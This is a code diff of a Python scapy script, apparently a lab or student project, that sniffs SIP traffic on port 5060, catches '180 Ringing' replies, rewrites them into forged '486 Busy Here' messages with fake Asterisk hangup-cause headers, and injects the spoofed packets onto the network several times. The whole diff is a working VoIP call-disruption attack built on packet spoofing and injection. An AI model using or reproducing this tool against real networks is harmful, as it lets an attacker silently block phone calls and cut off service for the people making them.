@@ -1,4 +1,4 @@
-from scapy.all import sniff, Ether, IP, UDP, sendp, ICMP, rdpcap
+from scapy.all import sniff, Ether, IP, UDP, sendp, ICMP, rdpcap,Raw
 import scapy.fields
 import re
 import codecs
@@ -6,47 +6,63 @@ import argparse
 
 def traffic_parser(packet):
     BUSY_1 = 'SIP/2.0 486 Busy Here'
-    BUSY_2 = 'X-Asterisk-HangupCause: Call Rejected\r\X-Asterisk-HangupCauseCode: 21'
-    BUSY_3 = ''
+    BUSY_2 = 'X-Asterisk-HangupCause: Call Rejected\\\\r\\\\nX-Asterisk-HangupCauseCode: 21'
 
     payload = packet[3].command()
+    # payload = packet[3]
 
+    # print(payload_comm)
+    print(bytes(payload))
 
     header=re.findall("Ringing", payload)
     if header:
+        
+        eth_attributes={}
+        eth_attributes['dst']=packet[0].dst
+        eth_attributes['src']=packet[0].src
+        eth_attributes['type']=packet[0].type
+        
+        eth = Ether_layer(eth_attributes)
 
-        ip_attributes={}
-        ip_attributes['version']=packet[1].version
-        ip_attributes['ihl']=packet[1].ihl
-        ip_attributes['tos']=packet[1].tos
-        ip_attributes['len']=511 #packet[1].len
-        ip_attributes['id']=packet[1].id+10
-        ip_attributes['flags']=packet[1].flags
-        ip_attributes['frag']=packet[1].frag
-        ip_attributes['ttl']=packet[1].ttl
-        ip_attributes['proto']=packet[1].proto
-        ip_attributes['src']=packet[1].src
-        ip_attributes['dst']=packet[1].dst
-
-        IP_layer(ip_attributes)
 
         udp_attributes={}
         udp_attributes['sport']=packet[2].sport
         udp_attributes['dport']=packet[2].dport
-        udp_attributes['len']=491
+        udp_attributes['len']=444
     
-        UDP_layer(udp_attributes)
+        udp = UDP_layer(udp_attributes)
 
 
         # print(payload)
         
         # Implement packet modification
         payload = payload.replace("SIP/2.0 180 Ringing", BUSY_1, 1)
-        payload = re.sub("Contact\:.*>", "X-Asterisk-HangupCause: Call Rejected\\\\r\\\X-Asterisk-HangupCauseCode: 21", payload,1)
+        payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
+        payload = payload.replace("Raw(load=b\'", '', 1)
+        payload = re.sub("\'\)$", '', payload, 1)
+        # payload = payload.replace("\\\\", "\\")
 
-        print(payload)
+        for incr in range(1,5):
+            ip_attributes={}
+            ip_attributes['version']=packet[1].version
+            ip_attributes['tos']=packet[1].tos
+            ip_attributes['len']=464 #packet[1].len
+            # ip_attributes['id']=packet[1].id+incr
+            ip_attributes['id']=0
+            ip_attributes['flags']=packet[1].flags
+            ip_attributes['frag']=packet[1].frag
+            ip_attributes['ttl']=packet[1].ttl
+            ip_attributes['proto']=packet[1].proto
+            ip_attributes['src']=packet[1].src
+            ip_attributes['dst']=packet[1].dst
 
-    print("\n")
+            ip = IP_layer(ip_attributes)
+
+            sendp(eth/ip/udp/Raw(load=payload))
+
+            print(payload)
+            print(Raw(load=payload))
+            print("\n")
 
 def Ether_layer(attributes):
     layer2=Ether()
@@ -60,7 +76,7 @@ def Ether_layer(attributes):
 def IP_layer(attributes):
     layer3=IP()
     layer3.version=attributes['version']
-    layer3.ihl=attributes['ihl']
+    # layer3.ihl=attributes['ihl']
     layer3.tos=attributes['tos']
     layer3.len=attributes['len']
     layer3.id=attributes['id']
@@ -91,8 +107,10 @@ parser.add_argument('-t', "--testfile", help="parse test file (optional)")
 args=parser.parse_args()
 
 if __name__ == '__main__':
-    # sniff(iface=args.interface, prn=traffic_parser, filter="udp and port 5060", store=0)
 
-    packets = rdpcap("mpourdelaaa.pcapng")
-    for packet in packets:
-        traffic_parser(packet)
+    if args.testfile:
+        packets = rdpcap(args.testfile)
+        for packet in packets:
+            traffic_parser(packet)
+    else:
+        sniff(iface=args.interface, prn=traffic_parser, filter="udp and port 5060", store=0)
